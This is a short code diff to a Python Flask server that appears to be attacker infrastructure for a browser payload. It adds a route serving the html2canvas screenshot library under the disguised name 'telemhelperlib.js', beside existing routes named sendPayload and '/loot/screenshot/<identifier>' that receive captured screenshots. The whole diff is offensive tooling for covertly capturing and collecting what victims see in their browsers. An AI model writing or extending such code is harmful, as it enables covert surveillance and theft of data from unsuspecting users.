@@ -122,6 +122,13 @@ def sendPayload():
         return file.read(), 200
 
 
+# Send copy of html2canvas library
+@app.route('/lib/telemhelperlib.js', methods=['GET'])
+def sendHtml2Canvas():
+    with open('./html2canvas.min.js', 'rb') as file:
+        return file.read(), 200
+
+
 
 # Capture screenshot
 @app.route('/loot/screenshot/<identifier>', methods=['POST'])
